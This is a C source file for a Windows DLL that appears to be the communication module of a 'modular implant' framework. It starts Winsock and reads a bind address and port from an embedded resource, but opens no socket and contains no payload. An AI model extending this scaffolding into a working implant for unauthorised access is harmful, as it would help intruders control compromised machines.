#pragma comment(lib, "Ws2_32.lib")

#include <Winsock2.h>

#include <Windows.h>

#include "CommunicationModule.h"
#include "ImplantModule.h"
#include "ModularImplant.h"

BOOL WINAPI
DllMain(
	HINSTANCE hinstDLL,
	DWORD fdwReason,
	LPVOID lpReserved)
{
	switch (fdwReason)
	{
	case DLL_PROCESS_ATTACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
	case DLL_PROCESS_DETACH:
		break;
	}

	return TRUE;
}

BOOL
StartServer(
	HMODULE hModule)
{
	PVOID pBindIpAddressPortResource = NULL;
	PWSTR pwszBindIpAddressPort = NULL;
	DWORD dwBindIpAddressPortLen = 0;
	SOCKADDR_IN sinServer = { 0 };
	INT iAddressLength = sizeof(sinServer);
	HRESULT hResult = S_FALSE;

	if (FALSE == GetResourceData(hModule,
		CMRID_BindIpAddressPort,
		&pBindIpAddressPortResource,
		&dwBindIpAddressPortLen))
	{
		LOG_ERROR("GetResourceData failed");
		return FALSE;
	}

	dwBindIpAddressPortLen += sizeof(*pwszBindIpAddressPort);
	pwszBindIpAddressPort = HeapAlloc(GetProcessHeap(),
		HEAP_ZERO_MEMORY,
		dwBindIpAddressPortLen);
	if (NULL == pwszBindIpAddressPort)
	{
		LOG_ERROR("HeapAlloc failed");
		return FALSE;
	}

	hResult = StringCbCopyNW(pwszBindIpAddressPort,
		dwBindIpAddressPortLen,
		(STRSAFE_LPCWSTR)pBindIpAddressPortResource,
		dwBindIpAddressPortLen - sizeof(*pwszBindIpAddressPort));
	if (FAILED(hResult))
	{
		LOG_ERROR("StringCbCopyNW failed");
		HeapFree(GetProcessHeap(), 0, pwszBindIpAddressPort);
		return FALSE;
	}
	
	if (0 != WSAStringToAddressW(
		pwszBindIpAddressPort,
		AF_INET,
		NULL,
		(LPSOCKADDR)&sinServer,
		&iAddressLength))
	{
		LOG_ERROR("WSAStringToAddress failed");
		return FALSE;
	} 

	return TRUE;
}

BOOL
Init(
	enum MODULE_INIT eModuleInitType,
	HMODULE hmThis)
{
	WSADATA WSAData = { 0 };

	if (0 != WSAStartup(MAKEWORD(2, 2), &WSAData))
	{
		LOG_ERROR("WSAStartup failed");
		return FALSE;
	}

	switch (eModuleInitType)
	{
	case MODULE_INIT_LOCAL:
		StartServer(hmThis);
		break;
	case MODULE_INIT_REMOTE:
	default:
		break;
	}

	return TRUE;
}